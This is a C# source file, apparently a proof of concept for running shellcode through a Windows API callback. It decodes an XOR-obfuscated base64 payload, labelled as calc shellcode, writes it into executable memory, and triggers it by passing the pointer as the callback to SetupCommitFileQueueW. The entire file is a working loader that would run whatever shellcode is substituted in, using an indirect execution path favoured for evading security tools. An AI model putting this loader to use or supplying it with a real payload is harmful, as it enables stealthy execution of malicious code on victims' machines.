using System;
using System.Runtime.InteropServices;
using System.IO;

namespace AltCallbacks
{
    class Callback
    {
        const uint SP_COPY_NOSKIP = 0x00000400;

        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("Setupapi.dll")]
        public static extern bool SetupQueueCopyW(
            IntPtr QueueHandle,
            string   SourceRootPath,
            string   SourcePath,
            string   SourceFilename,
            string   SourceDescription,
            string   SourceTagfile,
            string   TargetDirectory,
            string   TargetFilename,
            uint    CopyStyle 
        );

        [DllImport("Setupapi.dll")]
        static extern bool SetupCommitFileQueueW(IntPtr Owner, IntPtr QueueHandle, IntPtr MsgHandler, IntPtr Context);

        [DllImport("Setupapi.dll")]
        static extern IntPtr SetupOpenFileQueue();

        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(IntPtr hWnd);

        static string key = "THISISMYKEY";

        static void Main(string[] args)
        {
            // Calc shellcode
            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";

            byte[] decoded = Convert.FromBase64String(base64);
            byte[] shellcode = new byte[decoded.Length];

            for (int i = 0; i < decoded.Length; i++)
                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));

            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(shellcode, 0, p, shellcode.Length);

            // Create a setup file queue
            IntPtr hQueue = SetupOpenFileQueue();
            
            // Add a single file copy operation to the setup file queue
            SetupQueueCopyW(hQueue, "C:\\", "Windows\\System32\\", "kernel32.dll", null, null, Path.GetTempPath(), "wcfP487.tmp", SP_COPY_NOSKIP);

            // Callback function
            SetupCommitFileQueueW(GetTopWindow(IntPtr.Zero), hQueue, p, IntPtr.Zero);

            return;
        }
    }
}
